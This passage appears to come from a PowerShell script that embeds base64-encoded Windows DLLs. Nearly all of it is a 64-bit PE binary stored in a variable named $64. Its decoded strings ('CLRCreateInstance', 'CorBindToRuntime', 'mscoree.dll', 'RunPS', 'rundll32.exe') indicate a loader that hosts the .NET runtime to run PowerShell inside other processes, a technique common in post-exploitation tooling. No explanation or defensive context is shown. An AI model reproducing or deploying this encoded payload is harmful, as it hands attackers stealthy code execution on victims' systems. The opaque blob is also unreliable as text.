NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAC8AAAAATAWMCUwYDC2MMUwEjGGMcMx2jHuMRkyHjIrMlcyaDJ+MosykDKiMqcy0TLWMiYzLjNLM1YzYDNlM2ozbzOmM7UzwzTqNPM0/TQPNZs1oDXTNbY2xTYENx83OzdTN6I3qDfKN/g3hjimOKs4ujgcOSs5tTnQOek5SzqOOtg6/DobOz47dzuHOzI8YTxxPIg8mTyqPK88yDzNPNo8Jz1EPU49XD1uPYM9wT3TPY0+wD4JP2U/ACAAABABAAAoMFkwqDC7MM4w2jDqMPswITE2MT0xQzFVMV8xvTHKMfEx+TESMnwygTKbMrkywjLNMtQy9DL6MgAzBjMMMxIzGTMgMyczLjM1MzwzQzNLM1MzWzNnM3AzdTN7M4UzjzOfM68zvzPIM+ozAjQINB00NTQ7NEs0cTSINLk01jTsNAA1GzUnNTY1PzVMNXs1gzWONZQ1mjWmNaw1zzUANqs2yjbUNuU28jb3Nh03IjdRN243sTe/N9o35TdtOHY4fjjFONQ42zgRORo5JzkyOTs5TjmQOZY5nDmiOag5rjm0Obo5wDnGOcw50jnYOd455DnqOfA59jn8OQI6CDoUOkE6nDr0OgE7BzsAMAAAvAAAAOAw6DAQMRgxHDEgMSQxKDEsMTAxSDFMMVAxZDFoMWwxHDMgMygzSDNMM1wzYDNoM4AzkDOUM6QzqDOwM8gz2DPcM+wz8DP0M/wzFDQkNCg0ODQ8NEA0RDRMNGQ0rDe4N9w3/DcEOAw4FDgcOCQ4MDhQOFg4YDhoOHA4jDiQOJg4oDioOLA4xDjgOAA5HDkgOTw5QDlIOVA5WDlcOWQ5eDmAOZQ5nDmkOaw5sDm0Obw50DkAAABAAAAMAAAAADAAAABwAAAUAAAAWDt0O4w7qDvEOwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $64="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